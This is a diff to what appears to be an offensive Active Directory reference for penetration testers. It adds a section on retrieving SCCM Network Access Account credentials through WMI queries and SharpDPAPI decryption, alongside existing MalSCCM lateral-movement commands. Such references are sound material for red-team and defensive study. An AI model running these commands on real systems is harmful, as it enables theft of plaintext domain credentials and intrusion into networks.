@@ -113,6 +113,7 @@
     - [Kerberos Bronze Bit Attack - CVE-2020-17049](#kerberos-bronze-bit-attack---cve-2020-17049)
     - [PrivExchange attack](#privexchange-attack)
     - [SCCM Deployment](#sccm-deployment)
+    - [SCCM Network Access Accounts](#sccm-network-access-accounts)
     - [WSUS Deployment](#wsus-deployment)
     - [RODC - Read Only Domain Controller Compromise](#rodc---read-only-domain-controller-compromise)
     - [PXE Boot image attack](#pxe-boot-image-attack)
@@ -3521,7 +3522,7 @@ python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th 
     MalSCCM.exe inspect /server:<DistributionPoint Server FQDN> /groups
     ```
 * Compromise management server, use locate to find primary server
-* use Inspect on primary server to view who you can target
+* Use `inspect` on primary server to view who you can target
     ```ps1
     MalSCCM.exe inspect /all
     MalSCCM.exe inspect /computers
@@ -3559,6 +3560,28 @@ python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th 
     MalSCCM.exe app /cleanup /name:demoapp
     MalSCCM.exe group /delete /groupname:TargetGroup
     ```
+
+
+### SCCM Network Access Accounts
+
+> If you can escalate on a host that is an SCCM client, you can retrieve plaintext domain credentials.
+
+* Find SCCM blob
+    ```ps1
+    Get-Wmiobject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"
+    NetworkAccessPassword : <![CDATA[E600000001...8C6B5]]>
+    NetworkAccessUsername : <![CDATA[E600000001...00F92]]>
+    ```
+* Using [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI/blob/81e1fcdd44e04cf84ca0085cf5db2be4f7421903/SharpDPAPI/Commands/SCCM.cs#L208-L244) for SCCM retrieval and decryption
+    ```ps1
+    .\SharpDPAPI.exe SCCM
+    ```
+* Check ACL for the CIM repository located at `C:\Windows\System32\wbem\Repository\OBJECTS.DATA`:
+    ```ps1
+    Get-Acl C:\Windows\System32\wbem\Repository\OBJECTS.DATA | Format-List -Property PSPath,sddl
+    ConvertFrom-SddlString ""
+    ```
+
 
 ### WSUS Deployment
 
@@ -3929,3 +3952,5 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [DIVING INTO PRE-CREATED COMPUTER ACCOUNTS - May 10, 2022 - By Oddvar Moe](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/)
 * [How NOT to use the PAM trust - Leveraging Shadow Principals for Cross Forest Attacks - Thursday, April 18, 2019 - Nikhil SamratAshok Mittal](http://www.labofapenetrationtester.com/2019/04/abusing-PAM.html)
 * [Shadow Credentials - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
+* [Network Access Accounts are evil… - ROGER ZANDER - 13 SEP 2015](https://rzander.azurewebsites.net/network-access-accounts-are-evil/)
+* [The Phantom Credentials of SCCM: Why the NAA Won’t Die - Duane Michael - Jun 28](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)
